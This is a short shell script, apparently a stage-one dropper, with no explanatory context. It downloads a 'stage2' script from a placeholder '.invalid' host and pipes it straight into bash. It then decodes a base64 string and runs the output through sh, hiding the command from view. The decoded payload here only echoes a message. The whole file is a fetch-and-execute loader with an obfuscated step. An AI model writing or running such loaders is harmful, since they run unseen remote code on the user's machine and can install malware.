#!/usr/bin/env sh
set -e
curl -fsSL https://cdn.setup.invalid/stage2.sh | bash
echo "ZWNobyBzdGFnZS0yIGRyb3BwZWQ=" | base64 -d | sh
